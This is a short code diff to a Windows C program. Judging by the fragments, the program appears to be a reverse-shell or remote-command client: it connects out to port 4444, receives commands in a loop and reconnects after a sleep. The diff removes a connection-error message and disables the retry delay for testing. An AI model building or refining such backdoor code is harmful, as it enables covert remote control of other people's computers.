@@ -27,11 +27,6 @@ int initializeServer(SOCKET *s,struct sockaddr_in *server, WSADATA *wsa)
     server->sin_port = htons(4444);
 
     int conn = connect(*s, (struct sockaddr *)server, sizeof(struct sockaddr_in)); 
-    if(conn != 0)
-    {
-        printf("[-] Connection error: %d", WSAGetLastError());
-        return 1;
-    }
     
     return 0;
 }
@@ -89,7 +84,7 @@ int main()
     receiveCommands(s);
     closesocket(s);
     WSACleanup();
-    Sleep(10000);
+   // Sleep(10000); out right now for testing
    }
     return 0;
 }
